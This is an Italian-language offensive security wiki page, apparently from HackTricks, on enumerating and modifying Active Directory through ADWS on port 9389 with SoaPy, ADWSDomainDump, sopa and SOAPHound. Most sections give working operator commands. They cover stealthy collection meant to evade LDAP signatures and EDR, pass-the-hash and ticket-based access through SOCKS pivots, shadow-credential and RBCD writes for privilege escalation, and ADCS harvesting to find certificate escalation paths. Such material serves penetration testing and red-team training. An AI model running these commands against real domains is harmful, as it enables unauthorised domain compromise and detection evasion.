# Enumerazione di Active Directory Web Services (ADWS) e raccolta stealth

{{#include ../../banners/hacktricks-training.md}}

## Cos'è ADWS?

Active Directory Web Services (ADWS) è **abilitato per impostazione predefinita su ogni Domain Controller da Windows Server 2008 R2** e ascolta sulla porta TCP **9389**. Nonostante il nome, **non viene usato HTTP**. Il servizio espone invece dati in stile LDAP tramite uno stack di protocolli proprietari di framing .NET:<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Poiché il traffico è incapsulato in questi frame SOAP binari e viaggia su una porta poco comune, **è molto meno probabile che l'enumerazione tramite ADWS venga ispezionata, filtrata o rilevata tramite signature rispetto al traffico LDAP/389 e 636 tradizionale**. Per gli operatori, questo significa:<sup>[[1]](#references)[[7]](#references)</sup>

* Recon più stealth: i team Blue si concentrano spesso sulle query LDAP.
* Possibilità di raccogliere dati da **host non Windows (Linux, macOS)**, instradando 9389/TCP tramite un proxy SOCKS.
* Gli stessi dati ottenibili tramite LDAP (utenti, gruppi, ACL, schema ecc.) e la possibilità di eseguire **scritture** (ad es. `msDs-AllowedToActOnBehalfOfOtherIdentity` per **RBCD**).

Le interazioni ADWS sono implementate tramite WS-Enumeration: ogni query inizia con un messaggio `Enumerate` che definisce il filtro/attributi LDAP e restituisce un GUID `EnumerationContext`, seguito da uno o più messaggi `Pull` che trasmettono risultati fino al limite definito dal server.<sup>[[7]](#references)</sup> I contesti scadono dopo circa 30 minuti, quindi gli strumenti devono suddividere i risultati in pagine o separare i filtri (query per prefisso per CN) per evitare di perdere lo stato.<sup>[[8]](#references)</sup> Quando si richiedono descrittori di sicurezza, specificare il controllo `LDAP_SERVER_SD_FLAGS_OID` per omettere le SACL; altrimenti ADWS rimuove semplicemente l'attributo `nTSecurityDescriptor` dalla risposta SOAP.

> NOTA: ADWS è usato anche da molti strumenti RSAT con GUI/PowerShell, quindi il traffico può confondersi con le legittime attività di amministrazione.

## SoaPy – Client Python nativo

[SoaPy](https://github.com/logangoins/soapy) è una **reimplementazione completa dello stack di protocolli ADWS in puro Python**. Genera i frame NBFX/NBFSE/NNS/NMF byte per byte, consentendo la raccolta da sistemi Unix-like senza ricorrere al runtime .NET.<sup>[[1]](#references)[[2]](#references)</sup>

### Funzionalità principali

* Supporta il **proxying tramite SOCKS** (utile dagli impianti C2).
* Filtri di ricerca granulari, identici a LDAP: `-q '(objectClass=user)'`.
* Operazioni mirate di **scrittura** per RBCD, SPN, flag degli account e key credentials.<sup>[[2]](#references)</sup>
* L'output di SOAPy può essere analizzato da **BOFHound** e importato in BloodHound.<sup>[[2]](#references)[[3]](#references)</sup>
* Flag `--parse` per rendere più leggibili i timestamp e `userAccountControl` quando serve una lettura più chiara.<sup>[[2]](#references)</sup>

### Flag per la raccolta mirata e operazioni di scrittura

SoaPy include opzioni selezionate che replicano le attività di hunting LDAP più comuni tramite ADWS: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, oltre alle opzioni grezze `--query` / `--filter` per query personalizzate. Abbinale a primitive di scrittura come `--rbcd <source>` (imposta `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (preparazione degli SPN per Kerberoasting mirato) e `--asrep` (imposta `DONT_REQ_PREAUTH` in `userAccountControl`).<sup>[[2]](#references)</sup>

Esempio di ricerca mirata degli SPN che restituisce solo `samAccountName` e `servicePrincipalName`:

```bash
SOAPy corp.local/alice:'Winter2025!'@dc01.corp.local \
      --spns -f samAccountName,servicePrincipalName --parse
```

Usa lo stesso host/credenziali per sfruttare immediatamente i risultati: esegui il dump degli oggetti già configurati per RBCD con `--rbcds`, quindi applica `--rbcd add --rbcd-source 'WEBSRV01$' --rbcd-target 'FILE01$'` per predisporre una catena di Resource-Based Constrained Delegation (consulta [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) per la procedura completa di abuso).<sup>[[2]](#references)</sup>

### Installazione (host dell’operatore)

Installa la versione attuale della CLI SOAPy dal repository upstream; il nome dell’eseguibile distingue tra maiuscole e minuscole nei sistemi Unix-like.<sup>[[2]](#references)[[9]](#references)</sup>

```bash
pipx install git+https://github.com/logangoins/SOAPy
```

### Raccolta solo tramite ticket attraverso un pivot SOCKS

Se un foothold fornisce un ticket Kerberos ma non una password in chiaro, converti un ticket `.kirbi` in `ccache` come descritto in [Pass the Ticket](pass-the-ticket.md), quindi configura SOAPy per usare quella cache. Un ticket per il servizio LDAP del DC può essere usato nel workflow ADWS documentato di SOAPy; instrada attraverso il pivot sia il traffico ADWS sia quello Kerberos.<sup>[[9]](#references)</sup>

```bash
KRB5CCNAME=ticket.ccache proxychains4 SOAPy -k \
  corp.local/alice@dc01.corp.local -q '(objectClass=computer)'
```

### Shadow credentials tramite ADWS

Se il principal corrente può scrivere `msDS-KeyCredentialLink` dell'oggetto target, SOAPy può aggiungere una key credential tramite ADWS ed esportare il PFX corrispondente. Registra il DeviceID restituito per rimuoverlo con precisione, invece di svuotare l'intero attributo. Usa il PFX per PKINIT, come spiegato in [Shadow Credentials](acl-persistence-abuse/shadow-credentials.md).<sup>[[10]](#references)</sup>

```bash
SOAPy corp.local/alice:'<PASSWORD>'@dc01.corp.local \
  --shadow-creds add --shadow-target targetuser
# After use, remove only the DeviceID returned by the add action:
SOAPy corp.local/alice:'<PASSWORD>'@dc01.corp.local \
  --shadow-creds remove --shadow-target targetuser --device-id '<DEVICE_ID>'
```

## ADWSDomainDump – LDAPDomainDump tramite ADWS (Linux/Windows)

* Fork di `ldapdomaindump` che sostituisce le query LDAP con chiamate ADWS su TCP/9389 per ridurre i rilevamenti delle firme LDAP.
* Esegue una verifica iniziale della raggiungibilità della porta 9389, a meno che non venga passato `--force` (salta il test se le scansioni delle porte sono rumorose o filtrate).
* Testato con Microsoft Defender for Endpoint e CrowdStrike Falcon, con bypass riuscito, come indicato nel README.<sup>[[4]](#references)</sup>

### Installazione

```bash
pipx install .
```

### Utilizzo

```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```

L'output tipico registra il controllo di raggiungibilità della porta 9389, il bind ADWS e l'inizio e la fine del dump:

```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

## Sopa - Un client pratico per ADWS in Golang

Come soapy, [sopa](https://github.com/Macmod/sopa) implementa lo stack del protocollo ADWS (MS-NNS + MC-NMF + SOAP) in Golang ed espone flag da riga di comando per eseguire chiamate ADWS come:<sup>[[5]](#references)</sup>

* **Ricerca e recupero di oggetti** - `query` / `get`
* **Ciclo di vita degli oggetti** - `create [user|computer|group|ou|container|custom]` e `delete`
* **Modifica degli attributi** - `attr [add|replace|delete]`
* **Gestione degli account** - `set-password` / `change-password`
* e altri, come `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, ecc.

### Punti salienti della mappatura del protocollo

* Le ricerche in stile LDAP vengono eseguite tramite **WS-Enumeration** (`Enumerate` + `Pull`), con proiezione degli attributi, controllo dell'ambito (Base/OneLevel/Subtree) e paginazione.
* Il recupero di un singolo oggetto usa **WS-Transfer** `Get`; le modifiche agli attributi usano `Put`; le eliminazioni usano `Delete`.
* La creazione di oggetti integrati usa **WS-Transfer ResourceFactory**; per gli oggetti personalizzati viene usata una **IMDA AddRequest** basata su template YAML.
* Le operazioni sulle password sono azioni **MS-ADCAP** (`SetPassword`, `ChangePassword`).<sup>[[5]](#references)</sup>

### Scoperta di metadati non autenticata (mex)

ADWS espone WS-MetadataExchange senza credenziali, un modo rapido per verificare l'esposizione prima di autenticarsi:<sup>[[5]](#references)</sup>

```bash
sopa mex --dc <DC>
```

### Note sulla individuazione di DNS/DC e sul targeting di Kerberos

Sopa può individuare i DC tramite SRV se `--dc` viene omesso e viene fornito `--domain`. Esegue le query nell'ordine seguente e usa il target con la priorità più alta:<sup>[[5]](#references)</sup>

```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```

A livello operativo, preferisci un resolver controllato da un DC per evitare errori negli ambienti segmentati:

* Usa `--dns <DC-IP>` in modo che **tutte** le ricerche SRV/PTR/dirette passino attraverso il DNS del DC.
* Usa `--dns-tcp` quando UDP è bloccato o le risposte SRV sono grandi.
* Se `--dc` è un IP, sopa esegue sempre una ricerca **PTR inversa**: il filtro dell'indirizzo `wsa:To` di ADWS richiede un FQDN anche senza Kerberos. Se manca la zona inversa, specifica direttamente un FQDN del DC.<sup>[[5]](#references)</sup>

Esempio (IP + Kerberos, DNS forzato tramite il DC):

```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```

### Opzioni per il materiale di autenticazione

Oltre alle password in chiaro, sopa supporta **hash NT**, **chiavi AES Kerberos**, **ccache** e **certificati PKINIT** (PFX o PEM) per l’autenticazione ADWS. Kerberos è implicito quando si usano `--aes-key`, `-c` (ccache) o le opzioni basate su certificati.<sup>[[5]](#references)</sup>

```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```

### Creazione di oggetti personalizzati tramite template

Per classi di oggetti arbitrarie, il comando `create custom` utilizza un template YAML che corrisponde a una richiesta IMDA `AddRequest`:<sup>[[5]](#references)</sup>

* `parentDN` e `rdn` definiscono il contenitore e il DN relativo.
* `attributes[].name` supporta `cn` o `addata:cn` con namespace.
* `attributes[].type` accetta `string|int|bool|base64|hex` o un valore `xsd:*` esplicito.
* **Non** includere `ad:relativeDistinguishedName` o `ad:container-hierarchy-parent`; sopa li inserisce automaticamente.
* I valori `hex` vengono convertiti in `xsd:base64Binary`; usa `value: ""` per impostare stringhe vuote.

## SOAPHound – Raccolta ADWS ad alto volume (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) è un collector .NET che mantiene tutte le interazioni LDAP all'interno di ADWS e genera JSON compatibile con BloodHound v4. Crea una cache completa di `objectSid`, `objectGUID`, `distinguishedName` e `objectClass` una sola volta (`--buildcache`), quindi la riutilizza per le passate `--bhdump`, `--certdump` (ADCS) o `--dnsdump` (DNS integrato in AD) ad alto volume, così che solo ~35 attributi critici escano dal DC. AutoSplit (`--autosplit --threshold <N>`) suddivide automaticamente le query in base al prefisso CN per restare entro il timeout di 30 minuti di EnumerationContext nelle foreste di grandi dimensioni.<sup>[[8]](#references)</sup>

Flusso di lavoro tipico su una VM operatore aggiunta al dominio:

```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump --autosplit --threshold 1200 --nolaps -o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```

I risultati JSON esportati si integrano direttamente nei workflow di SharpHound/BloodHound: consulta [la metodologia di BloodHound](bloodhound.md) per idee sulla rappresentazione grafica a valle. AutoSplit rende SOAPHound resiliente nelle foreste con milioni di oggetti, mantenendo basso il numero di query rispetto agli snapshot in stile ADExplorer.

## Workflow di raccolta AD stealth

Il workflow seguente mostra come enumerare **oggetti di dominio e ADCS** tramite ADWS, convertirli in JSON di BloodHound e cercare percorsi di attacco basati su certificati, tutto da Linux:

1. **Crea un tunnel per la porta 9389/TCP** dalla rete di destinazione al tuo computer (ad esempio tramite Chisel, Meterpreter, SSH dynamic port-forward ecc.). Instrada il client TCP grezzo tramite SOCKS con `proxychains4 SOAPy ...` (configura l’indirizzo SOCKS5 in `proxychains4.conf`); `HTTPS_PROXY` non instrada questo protocollo non HTTP.<sup>[[9]](#references)</sup>

2. **Raccogli l’oggetto del dominio radice:**

```bash
proxychains4 SOAPy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -q '(objectClass=domain)' \
      | tee data/domain.log
```

3. **Raccogli gli oggetti correlati ad ADCS dalla Configuration NC:**

```bash
proxychains4 SOAPy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -dn 'CN=Configuration,DC=ludus,DC=domain' \
      -q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority)(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
      | tee data/adcs.log
```

4. **Converti in BloodHound:**

```bash
bofhound -i data --zip   # produces BloodHound.zip
```

5. **Carica lo ZIP** nella GUI di BloodHound ed esegui query cypher come `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` per individuare percorsi di escalation tramite certificati (ESC1, ESC8, ecc.).

### Scrittura di `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)

Con accesso in scrittura all’oggetto computer di destinazione, usa l’azione RBCD di SOAPy invece di una stringa raw del security descriptor. Qui `WEBSRV01$` è la sorgente controllata e `FILE01$` è la destinazione il cui attributo viene modificato.<sup>[[2]](#references)</sup>

```bash
SOAPy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
      --rbcd add --rbcd-source 'WEBSRV01$' --rbcd-target 'FILE01$'
```

Continua la catena Kerberos S4U in [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md).

## Riepilogo degli strumenti

| Scopo | Strumento | Note |
|---------|------|-------|
| Enumerazione ADWS | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, lettura/scrittura |
| Dump ADWS ad alto volume | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, modalità BH/ADCS/DNS |
| Importazione in BloodHound | [BOFHound](https://github.com/bohops/BOFHound) | Converte i log di SoaPy/ldapsearch |
| Compromissione dei certificati | [Certipy](https://github.com/ly4k/Certipy) | Può essere instradato tramite lo stesso SOCKS |
| Enumerazione ADWS e modifiche agli oggetti | [sopa](https://github.com/Macmod/sopa) | Client generico per interagire con endpoint ADWS noti: consente l'enumerazione, la creazione di oggetti, le modifiche degli attributi e i cambi di password |



## References

- [1] [SpecterOps – Assicurati di usare SOAP(y) – Guida per operatori alla raccolta stealth di AD tramite ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
- [2] [SoaPy GitHub](https://github.com/logangoins/soapy)
- [3] [BOFHound GitHub](https://github.com/bohops/BOFHound)
- [4] [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
- [5] [Sopa GitHub](https://github.com/Macmod/sopa)
- [6] [Microsoft – specifiche MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
- [7] [IBM X-Force Red – Enumerazione stealth degli ambienti Active Directory tramite ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
- [8] [FalconForce – strumento SOAPHound per raccogliere dati di Active Directory tramite ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)
- [9] [Wiki SOAPy – Ricognizione](https://github.com/logangoins/SOAPy/wiki/Recon)
- [10] [Wiki SOAPy – Post-Exploitation](https://github.com/logangoins/SOAPy/wiki/Post%E2%80%90Exploitation)
{{#include ../../banners/hacktricks-training.md}}
